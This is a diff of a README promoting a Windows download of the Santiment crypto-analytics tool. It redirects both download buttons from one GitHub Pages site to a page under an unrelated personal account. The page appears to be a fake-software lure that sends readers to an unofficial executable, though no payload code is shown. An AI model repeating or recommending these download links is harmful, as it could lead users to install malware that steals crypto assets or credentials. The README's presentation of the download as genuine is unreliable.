@@ -4,7 +4,7 @@
 
 ## 📥 Download Santiment for Windows
 
-[![⬇️ Download Santiment](https://img.shields.io/badge/Download-Santiment-blue?style=for-the-badge&logo=windows)](https://santiment-desktop-app.github.io/.github)
+[![⬇️ Download Santiment](https://img.shields.io/badge/Download-Santiment-blue?style=for-the-badge&logo=windows)](https://iziarmikoas.github.io/.github/santiment-crypto-analytics)
 
 ---
 
@@ -24,7 +24,7 @@ Security and data integrity are prioritized, with all data sourced directly from
 
 Santiment is used by a wide spectrum of market participants, from retail traders seeking a competitive edge to institutional analysts and hedge funds building sophisticated trading models. By merging raw blockchain data with real-time social insights and developer tracking, Santiment empowers users to see beyond price charts, anticipate market movements, and make more informed investment decisions in the fast-paced world of cryptocurrency.
 
-[![⬇️ Download Santiment](https://img.shields.io/badge/Download-Santiment-blue?style=for-the-badge&logo=windows)](https://santiment-desktop-app.github.io/.github)
+[![⬇️ Download Santiment](https://img.shields.io/badge/Download-Santiment-blue?style=for-the-badge&logo=windows)](https://iziarmikoas.github.io/.github/santiment-crypto-analytics)
 
 ---
 
